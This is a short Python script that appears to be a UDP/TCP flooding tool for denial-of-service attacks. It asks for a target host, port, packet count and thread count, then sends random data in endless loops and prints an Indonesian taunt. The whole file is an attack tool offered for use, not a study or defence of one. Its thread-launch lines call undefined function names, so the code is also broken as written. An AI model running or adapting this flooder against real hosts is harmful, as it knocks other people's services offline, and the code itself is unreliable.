import random
import socket
import threading

print("""                 
   \             /
      \       /
        \ / 
      /    \
   /          \ 
/                \
                              """)
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))

def wibu():
	data = random._urandom(1180)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("LARI!!!")
		except:
		    s.close()

def wibu2():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("LARI!!!")
		except:
			s.close()

for y in range(threads):
		th = threading.Thread(target = NGENTOT)
		th.start()
		th = threading.Thread(target = NGENTOT1)
		th.start()